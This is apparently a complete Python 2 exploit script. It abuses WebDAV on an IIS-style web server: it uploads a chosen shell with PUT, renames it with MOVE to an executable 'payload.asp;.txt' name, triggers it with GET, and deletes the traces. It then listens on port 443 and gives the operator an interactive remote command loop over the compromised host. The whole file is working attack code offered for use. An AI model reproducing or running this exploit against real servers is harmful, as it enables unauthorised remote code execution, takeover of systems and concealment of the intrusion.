import urllib3
import sys
import socket

import subprocess
from subprocess import CalledProcessError
import multiprocessing
from multiprocessing import Process
import sys


Usage="""

Usage: %s <target> <shell to upload>
"""%sys.argv[0]

if len(sys.argv) != 3:
	print Usage
	sys.exit()


target=sys.argv[1]
file=sys.argv[2]
uri='http://'+target+'/'
payload=str(open(file,'r').read())
harmless='payload.txt'
harmfull='payload.asp;.txt'

proxy_stream=urllib3.ProxyManager("http://127.0.0.1:8080/")

print '[!] Make sure you have your listener ready.\n\n'

print '[+] Uploading File....'
upload=proxy_stream.request('PUT',uri+harmless,headers={'Host':target},body=payload)

print '[+] Changing Extension....'
move=proxy_stream.request('MOVE',uri+harmless,headers={'Host':target,'Destination':'/'+harmfull},body=payload)

print '[+] Executing File....'
execute=proxy_stream.request('GET',uri+harmfull)

print '[+] Deleting File...'
delete=proxy_stream.request('DELETE',uri+harmless,headers={'Host':target})
delete=proxy_stream.request('DELETE',uri+harmfull,headers={'Host':target})

print '[+] Done....'


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(("0.0.0.0",443))		#listen on 443
s.listen(2)
print "[+] Listening on port 443 for that shelllll"
(client,(ip,port)) = s.accept()		#accept connection from ip,port and instantiate a client obj
print "[+] Connected to Target on :",ip

while True:
	com = raw_input('~$')	#get command from input
	client.send(com)		#send command to target
	endata = client.recv(2048)	#get encoded responce
	print endata

client.close()
s.close()



#stream=urllib3.PoolManager()